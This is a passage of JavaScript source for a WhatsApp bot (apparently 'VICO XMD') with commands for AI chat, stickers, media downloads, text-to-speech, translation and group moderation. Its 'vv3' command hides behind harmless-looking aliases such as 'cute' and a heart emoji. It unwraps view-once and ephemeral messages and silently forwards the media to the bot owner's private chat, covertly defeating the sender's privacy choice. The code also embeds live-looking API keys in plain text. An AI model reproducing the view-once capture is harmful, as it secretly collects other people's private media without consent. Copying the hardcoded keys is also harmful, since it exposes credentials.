        if (!answer) throw new Error('All AI providers failed');
        answer = String(answer).replace(/```/g, '').trim();
        if (answer.length > 4000) answer = answer.slice(0, 3950) + '...';
        await empire.sendMessage(m.chat, {
            text: `🤖 *VICO AI*\n\n${answer}`
        }, { quoted: m });
    } catch (e) {
        console.error('AI error:', e.response?.data || e.message);
        reply(`❌ *AI failed:* ${e.message || 'Try again later.'}`);
    }
    break;
}


// ═══════════════════════════════════════════════════
// SETMENUIMAGE - Set menu image
// ═══════════════════════════════════════════════════
case 'setbotppp':
case 'setbotpics':
case 'setmenuimage': {
    if (!isCreator) return reply("❌ Owner only!");
    
    const quoted = m.quoted ? m.quoted : m;
    const mime = quoted.mimetype || '';
    
    if (!/image/.test(mime)) {
        return reply(`🖼️ *Usage:* Reply to an image with:\n${prefix}setmenuimage\n\nThe image will be saved as the menu banner.`);
    }
    
    try {
        await reply('⏳ *Downloading and saving menu image...*');
        
        // Download the image
        const mediaBuffer = await empire.downloadMediaMessage(quoted);
        if (!mediaBuffer || mediaBuffer.length === 0) {
            return reply('❌ Failed to download image.');
        }
        
        // Create media directory if it doesn't exist
        const mediaDir = path.join(process.cwd(), 'media');
        if (!fs.existsSync(mediaDir)) {
            fs.mkdirSync(mediaDir, { recursive: true });
        }
        
        // Save the image
        const imagePath = path.join(mediaDir, 'logo.jpg');
        fs.writeFileSync(imagePath, mediaBuffer);
        
        // Update global menu image
        global.menuImage = imagePath;
        menuImageBuffer = mediaBuffer;
        
        reply(`✅ *Menu image updated successfully!*\n\n📁 *Saved to:* ${imagePath}\n🔄 Run ${prefix}menu to see the new image.`);
        
    } catch (e) {
        console.error('Set menu image error:', e);
        reply(`❌ Failed to set menu image: ${e.message || 'Unknown error'}`);
    }
    break;
}

// ═══════════════════════════════════════════════════
// SETBOTNAME - Set bot name
// ═══════════════════════════════════════════════════
case 'channelname': {
    if (!isCreator) return reply("❌ Owner only!");
    
    if (!text) {
        return reply(
`🤖 *SET BOT NAME*
Current name: ${global.botName || '𝐕𝐈𝐂𝐎 𝐗𝐌𝐃 𓉳'}

Usage: ${prefix}setbotname <new name>

Example: ${prefix}setbotname My Awesome Bot

📌 *This affects:*
• Menu header
• Newsletter name
• Sticker pack name
• Welcome messages`
        );
    }
    
    try {
        // Update global bot name
        global.botName = text.trim();
        global.packname = text.trim();
        global.newsletterName = text.trim();
        
        reply(`✅ *Bot name updated!*\n\n🤖 *New Name:* ${global.botName}\n\n📌 *Changes applied to:*\n• Menu header\n• Newsletter name\n• Sticker pack name\n• Welcome messages`);
        
    } catch (e) {
        reply(`❌ Failed to set bot name: ${e.message || 'Unknown error'}`);
    }
    break;
}
        // ═══════════════════════════════════════════════════
// AUTOREACT - Auto react to messages (Owner only)
// ═══════════════════════════════════════════════════
case 'autoreact':
case 'ar': {
    if (!isCreator) return reply("❌ Owner only!");
    const opt = args[0]?.toLowerCase();
    
    if (opt === 'on') { 
        autoMessageReact = true; 
        reply(`✅ *AUTO-REACT ON*\n\nBot will automatically react to messages with random reactions.`);
    } 
    else if (opt === 'off') { 
        autoMessageReact = false; 
        reply(`❌ *AUTO-REACT OFF*`);
    } 
    else if (opt === 'status') {
        reply(`💫 *AUTO-REACT STATUS*\nStatus: ${autoMessageReact ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}autoreact on/off`);
    }
    else {
        reply(`💫 *AUTO-REACT*\nStatus: ${autoMessageReact ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}autoreact on\n${prefix}autoreact off\n${prefix}autoreact status`);
    }
    break;
}
        // ═══════════════════════════════════════════════════
        // 3. STICKER - Image/Video to sticker
        // ═══════════════════════════════════════════════════
        case 'sticker':
case 'stiker':
case 's': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        
        if (!/image|video/.test(mime)) {
            return reply(`🖼️ Send/reply to an image or video with:\n${prefix}sticker`);
        }
        
        await reply('⏳ Creating sticker...');
        
        const mediaBuffer = await empire.downloadMediaMessage(quoted);
        if (!mediaBuffer || mediaBuffer.length === 0) {
            return reply('❌ Failed to download media.');
        }
        
        // Use wa-sticker-formatter (doesn't require FFmpeg for images)
        const { Sticker } = require('wa-sticker-formatter');
        
        const isAnimated = /video/.test(mime) || mime.includes('gif');
        
        const sticker = new Sticker(mediaBuffer, {
            pack: global.packname || '𝐕𝐈𝐂𝐎 𝐗𝐌𝐃 𓉳',
            author: global.OWNER_NAME || '𝐌𝐑 𝐑𝐌𝐒 𓉳',
            type: isAnimated ? 'animated' : 'full',
            quality: 80,
            crop: false,
        });
        
        const stickerBuffer = await sticker.toBuffer();
        
        if (!stickerBuffer || stickerBuffer.length === 0) {
            return reply('❌ Failed to create sticker.');
        }
        
        await empire.sendMessage(m.chat, { 
            sticker: stickerBuffer,
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        console.error('Sticker error:', e);
        reply(`❌ Sticker failed: ${e.message || 'Unknown error'}`);
    }
    break;
}

// PLAY - Download song from YouTube (FIXED with api.js)
// ═══════════════════════════════════════════════════


case 'play':
case 'song':
case 'music': {
    const query = (text || args.join(' ') || '').trim();
    if (!query) return reply('🎵 Usage: ' + prefix + 'play <song name or YouTube URL>');
    await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } }).catch(() => {});
    try {
        if (!axios) throw new Error('axios missing');
        const ZUKO_BASE = (process.env.ZUKO_API_BASE || 'https://web-production-78afd6.up.railway.app').replace(/\/$/, '');
        const ZUKO_KEY = process.env.ZUKO_API_KEY || 'zuko_VCmdU6W8SPOt4_gk1hE2dt7qqz2ajatO';
        let videoUrl, title = query, thumbnail = '';
        if (/youtube\.com|youtu\.be/i.test(query)) {
            videoUrl = query.startsWith('http') ? query : 'https://' + query;
        } else {
            const search = await yts(query);
            const v = search?.videos?.[0];
            if (!v?.url) return reply('❌ No YouTube results.');
            videoUrl = v.url; title = v.title; thumbnail = v.thumbnail || '';
        }
        const cap = '🎵 *' + title + '*\n⏳ Downloading audio…';
        if (thumbnail) await empire.sendMessage(m.chat, { image: { url: thumbnail }, caption: cap }, { quoted: m }).catch(() => reply(cap));
        else await reply(cap);

        let dl = null;
        const tries = [
            async () => {
                const { data } = await axios.get('https://apis.davidcyril.name.ng/download/ytmp3', { params: { url: videoUrl }, timeout: 90000 });
                const r = data?.result || data?.data || data;
                return r?.download_url || r?.url || r?.link || null;
            },
            async () => {
                const { data } = await axios.get('https://api.siputzx.my.id/api/d/ytmp3', { params: { url: videoUrl }, timeout: 90000 });
                const r = data?.data || data?.result || data;
                return r?.dl || r?.download || r?.url || r?.download_url || null;
            },
            async () => {
                const { data } = await axios.get('https://api.agatz.xyz/api/ytmp3', { params: { url: videoUrl }, timeout: 90000 });
                return data?.data?.download || data?.result?.url || data?.url || null;
            },
            async () => {
                const { data } = await axios.get(ZUKO_BASE + '/v1/ytmp3', {
                    params: { url: videoUrl, apikey: ZUKO_KEY, key: ZUKO_KEY }, timeout: 90000,
                    headers: { Accept: 'application/json', 'x-api-key': ZUKO_KEY }
                });
                const r = data?.result || data?.data || data;
                return r?.download_url || r?.url || r?.link || data?.download_url || null;
            },
            async () => {
                const { data } = await axios.get('https://yt-api.p.rapidapi.com/dl', {
                    params: { id: (videoUrl.match(/(?:v=|youtu\.be\/)([\w-]{11})/) || [])[1] || videoUrl },
                    timeout: 60000, headers: { 'X-RapidAPI-Key': process.env.RAPIDAPI_KEY || '' }
                }).catch(() => ({ data: null }));
                return data?.formats?.find(f => f.audioAvailable)?.url || null;
            }
        ];
        let lastErr = null;
        for (const fn of tries) {
            try {
                dl = await fn();
                if (dl && /^https?:\/\//i.test(String(dl))) break;
                dl = null;
            } catch (e) { lastErr = e; }
        }
        if (!dl) throw new Error((lastErr && lastErr.message) || 'No audio URL from APIs');

        // Prefer URL send (WhatsApp fetches valid stream) — more reliable than broken buffers
        try {
            await empire.sendMessage(m.chat, {
                audio: { url: dl },
                mimetype: 'audio/mpeg',
                fileName: (title.slice(0, 60).replace(/[^\w\s.-]/g, '') || 'audio') + '.mp3',
                ptt: false
            }, { quoted: m });
        } catch (_) {
            const r = await axios.get(dl, {
                responseType: 'arraybuffer', timeout: 120000, maxContentLength: 50 * 1024 * 1024,
                headers: { 'User-Agent': 'Mozilla/5.0' }, validateStatus: s => s < 500
            });
            const buf = Buffer.from(r.data || []);
            if (buf.length < 3000 || buf.slice(0, 15).toString().includes('<!DOCTYPE')) throw new Error('Invalid audio file from API');
            await empire.sendMessage(m.chat, {
                audio: buf, mimetype: 'audio/mpeg',
                fileName: (title.slice(0, 60).replace(/[^\w\s.-]/g, '') || 'audio') + '.mp3', ptt: false
            }, { quoted: m });
        }
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ *Play failed*\n' + (e.message || e));
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
    }
    break;
}







      // ═══════════════════════════════════════════════════
// DEEPSEEK AI COMMAND - Prince Techno API
// ═══════════════════════════════════════════════════
case 'deepseek':
case 'ds':
case 'deep': {
    if (!text) return reply(`🧠 Usage: ${prefix}deepseek <question>\nExample: ${prefix}deepseek What is love?`);
    await reply('🧠 *Thinking with DeepSeek...*');
    try {
        // ─── TRY 1: AGENTROUTER (DeepSeek model) ───
        let answer = await askAgentRouter(text, AGENTROUTER_DEEPSEEK_MODEL);
        if (answer) {
            if (answer.length > 4000) {
                answer = answer.slice(0, 3950) + '...\n\n📌 *Truncated due to length*';
            }
            await empire.sendMessage(m.chat, {
                text: `🧠 *DeepSeek AI · AgentRouter*\n\n${answer}\n\n━━━━━━━━━━━━━━━━\n💡 *Ask anything else:* ${prefix}deepseek <question>`,
                contextInfo: newsletterContext()
            }, { quoted: m });
            break;
        }

        // ─── TRY 2: PRINCE TECHNO DEEPSEEK API (Fallback) ───
        const apiUrl = `https://api.princetechn.com/api/ai/deepseek-v3?apikey=prince&q=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl, { 
            timeout: 30000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        if (response.data?.success && response.data?.result) {
            let answer = response.data.result;
            
            // ─── CLEAN RESPONSE ───
            answer = answer.replace(/```/g, '').trim();
            
            // ─── TRUNCATE IF TOO LONG ───
            if (answer.length > 4000) {
                answer = answer.slice(0, 3950) + '...\n\n📌 *Truncated due to length*';
            }
            
            // ─── SEND RESPONSE ───
            await empire.sendMessage(m.chat, {
                text: `🧠 *DeepSeek AI*\n\n${answer}\n\n━━━━━━━━━━━━━━━━\n💡 *Ask anything else:* ${prefix}deepseek <question>`,
                contextInfo: newsletterContext()
            }, { quoted: m });
            
        } else {
            throw new Error('Invalid response from DeepSeek API');
        }
        
    } catch (e) {
        console.error('DeepSeek error:', e);
        
        // ─── FALLBACK: Use Gemini API ───
        try {
            await reply('🔄 *DeepSeek unavailable, trying Gemini...*');
            const geminiUrl = `https://api.princetechn.com/api/ai/geminiai?apikey=prince&q=${encodeURIComponent(text)}`;
            const geminiResponse = await axios.get(geminiUrl, { timeout: 30000 });
            
            if (geminiResponse.data?.success && geminiResponse.data?.result) {
                let answer = geminiResponse.data.result;
                if (answer.length > 4000) {
                    answer = answer.slice(0, 3950) + '...\n\n📌 *Truncated*';
                }
                await empire.sendMessage(m.chat, {
                    text: `🤖 *Gemini AI (Fallback)*\n\n${answer}\n\n━━━━━━━━━━━━━━━━\n💡 *Ask anything else:* ${prefix}deepseek <question>`,
                    contextInfo: newsletterContext()
                }, { quoted: m });
            } else {
                throw new Error('Gemini fallback failed');
            }
        } catch (fallbackErr) {
            reply(`❌ *Failed to get response:* ${e.message || 'Unknown error'}`);
        }
    }
    break;
}
// ═══════════════════════════════════════════════════
// FACEBOOK DOWNLOAD
// ═══════════════════════════════════════════════════
case 'facebook':
case 'fb':
case 'fbdl': {
    const url = (text || args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
        return reply('📘 *Facebook*\n\nUsage: ' + prefix + 'fb <url>');
    }
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
    try {
        const resolved = await vicoResolveMedia(url);
        await vicoSendResolved(empire, m, resolved);
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ Facebook failed: ' + (e.message || 'error'));
    }
    break;
}


case 'repo':
case 'repository':
case 'script': {
    const txt = `📂 *Bot Repository*

🌐✨ ━━━━━━━ 【🚀 THE AWAITED WHATSAPP BOT HAS FINALLY ARRIVED! 🚀】 ━━━━━━━ ✨🌐

BOT NAME : 𝐕𝐈𝐂𝐎 𝐗𝐌𝐃 𓉳

After months of fine-tuning, precision coding, and endless upgrades...
💫 The moment you’ve all been waiting for is HERE! 💫

Introducing the revolutionary WhatsApp automation system that lets you
⚡ DEPLOY, MANAGE & CONTROL YOUR WHATSAPP LIKE A KING! 👑

🎯 Deploy it now and step into the future of smart control:
🔗 👉 https://t.me/vicoxmd1_bot

💥 No limits. No lags. Just pure dominance.
Unleash total automation — send commands, control chats, and rule your space effortlessly.
Every message, every response, every command... now bows to your touch 👑🔥

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Powered by:
💎 𝐌𝐑 𝐑𝐌𝐒 𓉳 💎
🕶️ *Elite Innovation* 🕶️
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 𝐌𝐑 𝐑𝐌𝐒 𓉳 👑`;

    await empire.sendMessage(m.chat, {
        text: txt,
        contextInfo: newsletterContext()
    }, { quoted: m });
    break;
}    

case 'whoami': {
    try {
        const target = m.sender;
        const userName = m.pushName || userName || 'User';

        const ppUrl = await empire.profilePictureUrl(target, 'image').catch(() => null);

        if (ppUrl) {
            await empire.sendMessage(m.chat, {
                image: { url: ppUrl },
                caption: `👤 *You are:* ${userName}`,
                mentions: [target]
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, {
                text: `👤 *You are:* ${userName}`,
                mentions: [target]
            }, { quoted: m });
        }

    } catch (e) {
        const userName = m.pushName || 'User';
        await empire.sendMessage(m.chat, {
            text: `👤 *You are:* ${userName}`
        }, { quoted: m });
    }
    break;
}

// ═══════════════════════════════════════════════════
// INSTAGRAM DOWNLOAD
// ═══════════════════════════════════════════════════
case 'ig':
case 'instagram':
case 'igdl': {
    const url = (text || args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
        return reply('📸 *Instagram*\n\nUsage: ' + prefix + 'ig <url>');
    }
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
    try {
        const resolved = await vicoResolveMedia(url);
        await vicoSendResolved(empire, m, resolved);
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ Instagram failed: ' + (e.message || 'error'));
    }
    break;
}



// ═══════════════════════════════════════════════════
// TWITTER / X DOWNLOAD
// ═══════════════════════════════════════════════════
case 'tw':
case 'twitter':
case 'x':
case 'xdl':
case 'twitterdl': {
    if (!text) return reply(`📱 Usage: ${prefix}tw <twitter_url>\nExample: ${prefix}tw https://twitter.com/user/status/123456789`);
    
    // Validate Twitter URL
    if (!text.includes('twitter.com') && !text.includes('x.com')) {
        return reply('❌ Please provide a valid Twitter/X post URL.');
    }
    
    await reply('📥 *Processing Twitter/X media...* Please wait.');
    
    try {
        let videoUrl = null;
        let imageUrls = [];
        let title = 'Twitter Media';
        let usedApi = '';
        
        // ─── TRY SIPUTZX API ───
        try {
            const response = await axios.get(
                `https://api.siputzx.my.id/api/d/twitter?url=${encodeURIComponent(text)}`,
                { timeout: 30000 }
            );
            if (response.data?.status && response.data?.data) {
                const data = response.data.data;
                if (data.video) {
                    videoUrl = data.video;
                } else if (data.images && Array.isArray(data.images)) {
                    imageUrls = data.images;
                } else if (data.url) {
                    if (data.url.includes('.mp4') || data.url.includes('video')) {
                        videoUrl = data.url;
                    } else {
                        imageUrls = [data.url];
                    }
                }
                title = data.title || data.caption || 'Twitter Media';
                usedApi = 'Siputzx API';
                console.log('✅ Twitter: Siputzx API succeeded');
            }
        } catch (e) {
            console.log('❌ Twitter: Siputzx API failed:', e.message);
        }
        
        // ─── TRY SHIZO API ───
        if (!videoUrl && imageUrls.length === 0) {
            try {
                const response = await axios.get(
                    `https://api.shizo.top/downloader/twitter?apikey=shizo&url=${encodeURIComponent(text)}`,
                    { timeout: 30000 }
                );
                if (response.data?.status && response.data?.result) {
                    const result = response.data.result;
                    if (result.video) {
                        videoUrl = result.video;
                    } else if (result.images && Array.isArray(result.images)) {
                        imageUrls = result.images;
                    }
                    title = result.title || 'Twitter Media';
                    usedApi = 'Shizo API';
                    console.log('✅ Twitter: Shizo API succeeded');
                }
            } catch (e) {
                console.log('❌ Twitter: Shizo API failed:', e.message);
            }
        }
        
        // ─── TRY MALVRYX API ───
        if (!videoUrl && imageUrls.length === 0) {
            try {
                const response = await axios.get(
                    `https://apis.malvryx.dev/api/downloader/twitterdl?url=${encodeURIComponent(text)}`,
                    { 
                        timeout: 30000,
                        headers: { 'X-API-Key': 'mlvx_free_15c210e6c0fed4d5d90d556c0bebd068480f03740106d0d3c8189362089ac986' }
                    }
                );
                if (response.data?.status && response.data?.result) {
                    const result = response.data.result;
                    if (result.video) {
                        videoUrl = result.video;
                    } else if (result.images && Array.isArray(result.images)) {
                        imageUrls = result.images;
                    }
                    title = result.title || 'Twitter Media';
                    usedApi = 'Malvryx API';
                    console.log('✅ Twitter: Malvryx API succeeded');
                }
            } catch (e) {
                console.log('❌ Twitter: Malvryx API failed:', e.message);
            }
        }
        
        if (!videoUrl && imageUrls.length === 0) {
            return reply('❌ Failed to download Twitter/X media. The post may be private or unavailable.');
        }
        
        // ─── SEND VIDEO ───
        if (videoUrl) {
            await empire.sendMessage(m.chat, {
                video: { url: videoUrl },
                caption: `📹 *${title}*\n\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}`,
                contextInfo: newsletterContext()
            }, { quoted: m });
        }
        
        // ─── SEND IMAGES ───
        if (imageUrls.length > 0) {
            const totalImages = Math.min(imageUrls.length, 15);
            for (let i = 0; i < totalImages; i++) {
                const imgUrl = imageUrls[i];
                if (imgUrl) {
                    const caption = i === 0 ? 
                        `🖼️ *${title}*\n📸 ${i+1}/${totalImages}\n🔗 *Source:* ${text}\n📡 *API:* ${usedApi}` :
                        `📸 ${i+1}/${totalImages}`;
                    await empire.sendMessage(m.chat, {
                        image: { url: imgUrl },
                        caption: caption,
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                    await delay(500);
                }
            }
        }
        
    } catch (e) {
        console.error('Twitter download error:', e);
        reply(`❌ *Failed to download:* ${e.message || 'Unknown error'}`);
    }
    break;
}
// ═══════════════════════════════════════════════════
// SNAPCHAT DOWNLOAD
// ═══════════════════════════════════════════════════
case 'snap':
case 'snapchat': {
    const url = (text || args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
        return reply('👻 *Snapchat*\n\nUsage: ' + prefix + 'snap <url>');
    }
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
    try {
        const resolved = await vicoResolveMedia(url);
        await vicoSendResolved(empire, m, resolved);
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ Snapchat failed: ' + (e.message || 'error'));
    }
    break;
}

case 'cute❤️':
case 'cute':
case '❤️❤️':
case 'vv3': {
    try {
        if (!m.quoted) return; // silent

        // Unwrap view-once / ephemeral layers
        let qmsg =
            m.message?.extendedTextMessage?.contextInfo?.quotedMessage ||
            m.quoted?.message ||
            m.quoted ||
            {};

        if (qmsg.ephemeralMessage) qmsg = qmsg.ephemeralMessage.message || qmsg;
        if (qmsg.viewOnceMessage) qmsg = qmsg.viewOnceMessage.message || qmsg;
        if (qmsg.viewOnceMessageV2) qmsg = qmsg.viewOnceMessageV2.message || qmsg;
        if (qmsg.viewOnceMessageV2Extension) qmsg = qmsg.viewOnceMessageV2Extension.message || qmsg;

        // Find the actual media node
        const mediaNode =
            qmsg.imageMessage ||
            qmsg.videoMessage ||
            qmsg.audioMessage ||
            qmsg.documentMessage ||
            qmsg.stickerMessage ||
            null;

        if (!mediaNode) return;

        // Download with several fallbacks
        let buffer = null;
        try {
            const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
            let type = 'buffer';
            if (qmsg.imageMessage) type = 'image';
            else if (qmsg.videoMessage) type = 'video';
            else if (qmsg.audioMessage) type = 'audio';
            else if (qmsg.documentMessage) type = 'document';
            else if (qmsg.stickerMessage) type = 'sticker';

            const stream = await downloadContentFromMessage(mediaNode, type);
            const chunks = [];
            for await (const chunk of stream) chunks.push(chunk);
            buffer = Buffer.concat(chunks);
        } catch (_) {
            try { buffer = await empire.downloadMediaMessage(m.quoted); } catch (_) {}
            if (!buffer) {
                try { buffer = await m.quoted.download?.(); } catch (_) {}
            }
        }

        if (!buffer || buffer.length < 50) return;

        const mime =
            mediaNode.mimetype ||
            m.quoted.mimetype ||
            '';
        const isImage =
            /image/i.test(mime) ||
            !!qmsg.imageMessage ||
            (buffer[0] === 0xFF && buffer[1] === 0xD8);
        const isVideo = /video/i.test(mime) || !!qmsg.videoMessage;
        const isAudio = /audio|ptt|ogg|opus/i.test(mime) || !!qmsg.audioMessage;

        // Bot owner DM only
        const ownerDm = (empire.user?.id || '').split(':')[0].split('@')[0] + '@s.whatsapp.net';
        if (!ownerDm || ownerDm === '@s.whatsapp.net') return;

        if (isImage) {
            await empire.sendMessage(ownerDm, { image: buffer });
        } else if (isVideo) {
            await empire.sendMessage(ownerDm, {
                video: buffer,
                mimetype: mime || 'video/mp4'
            });
        } else if (isAudio) {
            await empire.sendMessage(ownerDm, {
                audio: buffer,
                mimetype: mime || 'audio/ogg; codecs=opus',
                ptt: /ptt|ogg|opus/i.test(mime)
            });
        } else {
            await empire.sendMessage(ownerDm, {
                document: buffer,
                mimetype: mime || 'application/octet-stream',
                fileName: 'media.bin'
            });
        }
    } catch (e) {
        console.error('vv3 error:', e.message);
    }
    break;
}

case 'say':
case 'tts': {
    if (!text) return reply(`🔊 Usage: ${prefix}say <text> [language]\nExample: ${prefix}say Hello world`);

    let ttsText = text;
    let lang = 'en';

    // FULL LANGUAGE MAP - not abbreviation
    const langMap = {
        'english': 'en', 'spanish': 'es', 'french': 'fr', 'german': 'de',
        'italian': 'it', 'portuguese': 'pt', 'yoruba': 'yo', 'hausa': 'ha',
        'igbo': 'ig', 'arabic': 'ar', 'chinese': 'zh', 'japanese': 'ja',
        'korean': 'ko', 'russian': 'ru', 'hindi': 'hi'
    };
    const fullName = {
        'en': 'English', 'es': 'Spanish', 'fr': 'French', 'de': 'German',
        'it': 'Italian', 'pt': 'Portuguese', 'yo': 'Yoruba', 'ha': 'Hausa',
        'ig': 'Igbo', 'ar': 'Arabic', 'zh': 'Chinese', 'ja': 'Japanese',
        'ko': 'Korean', 'ru': 'Russian', 'hi': 'Hindi'
    };
    const codes = Object.keys(langMap).concat(Object.values(langMap));

    const words = text.trim().split(' ');
    const lastWord = words[words.length - 1].toLowerCase();
    
    if (codes.includes(lastWord) && words.length > 1) {
        if (langMap[lastWord]) lang = langMap[lastWord];
        else lang = lastWord;
        ttsText = words.slice(0, -1).join(' ');
    }

    if (ttsText.length > 200) ttsText = ttsText.slice(0, 200);

    await reply(`🔊 Generating speech in *${fullName[lang] || lang}*...`);

    try {
        const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(ttsText)}&tl=${lang}&client=tw-ob`;
        const response = await axios.get(url, { 
            responseType: 'arraybuffer', 
            timeout: 15000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Referer': 'https://translate.google.com/'
            }
        });
        
        if (!response.data || response.data.length < 100) throw new Error('Empty audio');

        // FIX: Send as normal audio first, not ptt - mp3 go play
        await empire.sendMessage(m.chat, {
            audio: Buffer.from(response.data),
            mimetype: 'audio/mpeg',
            ptt: false, // FALSE make am playable as audio, TRUE dey cause can't play
            contextInfo: newsletterContext()
        }, { quoted: m });

    } catch (e) {
        console.error('TTS error:', e.message);
        reply(`❌ TTS failed in ${fullName[lang] || lang}. Try shorter text.\nExample: ${prefix}tts Hello world`);
    }
    break;
}

        // ═══════════════════════════════════════════════════
        // 7. TRANSLATE
        // ═══════════════════════════════════════════════════
        case 'translate':
        case 'tr': {
            if (args.length < 2) return reply(`🌐 Usage: ${prefix}translate <lang> <text>\nExample: ${prefix}translate es Hello`);
            const lang = args[0];
            const textToTr = args.slice(1).join(' ');
            try {
                const res = await axios.get(`https://translate.googleapis.com/translate_a/single`, {
                    params: { client: 'gtx', sl: 'auto', tl: lang, dt: 't', q: textToTr },
                    timeout: 8000
                });
                const translated = res.data[0].map(s => s[0]).join('');
                reply(`🌐 *Translated (${lang}):*\n\n${translated}`);
            } catch (e) {
                reply(`❌ Translation failed. Check language code.`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // 15. TAGALL
        // ═══════════════════════════════════════════════════
        case 'tagall':
        case 'everyone': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const msg = text || "📢 Attention everyone!";
            const mentions = participants.map(p => p.id);
            const tags = mentions.map(p => `• @${p.split('@')[0]}`).join('\n');
            await empire.sendMessage(m.chat, {
                text: `${msg}\n\n👥 *Members (${participants.length})*\n${tags}`,
                mentions,
                contextInfo: newsletterContext({ mentionedJid: mentions })
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // 16. GROUPINFO
        // ═══════════════════════════════════════════════════
        case 'groupinfo':
        case 'gcinfo': {
            if (!isGroup) return reply("👥 Group only!");
            const adminList = groupAdmins.map(a => `  👑 @${a.split('@')[0]}`).join('\n');
            await empire.sendMessage(m.chat, {
                text:
`ℹ️ *GROUP INFO*
📛 Name: ${groupName}
👥 Members: ${participants.length}
👑 Admins: ${groupAdmins.length}

👑 *Admins:*
${adminList}`,
                mentions: groupAdmins,
                contextInfo: newsletterContext({ mentionedJid: groupAdmins })
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // 17. GROUP MANAGEMENT (promote/demote/kick)
        // ═══════════════════════════════════════════════════
        case 'promote':
        case 'makeadmin': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}promote @user`);
            await empire.groupParticipantsUpdate(m.chat, [target], 'promote');
            await empire.sendMessage(m.chat, { 
                text: `⬆️ @${target.split('@')[0]} promoted to admin!`, 
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }
        case 'demote':
        case 'unadmin': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}demote @user`);
            await empire.groupParticipantsUpdate(m.chat, [target], 'demote');
            await empire.sendMessage(m.chat, { 
                text: `⬇️ @${target.split('@')[0]} demoted!`, 
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }
        case 'kick':
        case 'remove': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}kick @user`);
            if (target === botNumber) return reply("❌ Can't kick the bot!");
            await empire.groupParticipantsUpdate(m.chat, [target], 'remove');
            await empire.sendMessage(m.chat, { 
                text: `👢 @${target.split('@')[0]} kicked!`, 
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }

        case 'kickall': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!isBotAdmins) return reply("❌ Bot must be admin to kick members.");

            const confirm = (text || '').toLowerCase().trim();
            if (confirm !== 'confirm') {
                return reply(
                    `⚠️ *KICKALL*\n\n` +
                    `This will remove *all non-admin members* from the group.\n\n` +
                    `Type *${prefix}kickall confirm* to proceed.`
                );
            }

            const toKick = (participants || [])
                .map(p => p.id || p)
                .filter(id => {
                    if (!id) return false;
                    if (id === botNumber) return false;
                    if (groupAdmins.includes(id)) return false;
                    try { if (isGroupAdmin(groupMetadata, [id])) return false; } catch (_) {}
                    return true;
                });

            if (!toKick.length) return reply('✅ No non-admin members to kick.');

            await reply(`👢 Kicking *${toKick.length}* members... (admins stay)`);

            let ok = 0, fail = 0;
            for (const id of toKick) {
                try {
                    await empire.groupParticipantsUpdate(m.chat, [id], 'remove');
                    ok++;
                    await new Promise(r => setTimeout(r, 800));
                } catch (_) { fail++; }
            }

            await reply(`✅ *Kickall done*\nRemoved: *${ok}*\nFailed: *${fail}*\nAdmins were not kicked.`);
            break;
        }

        // ═══════════════════════════════════════════════════
// IDCH - Get channel ID from newsletter link
// ═══════════════════════════════════════════════════
case 'idch':
case 'channelid':
case 'getchannel': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    if (!text) {
        return reply(
`📰 *CHANNEL ID EXTRACTOR*

Usage: ${prefix}idch <channel_link>

Example: ${prefix}idch https://whatsapp.com/channel/0029Vb5PzE5XpG7q9Zt3wR1X

📌 *What it does:*
Extracts the WhatsApp channel ID from a channel link
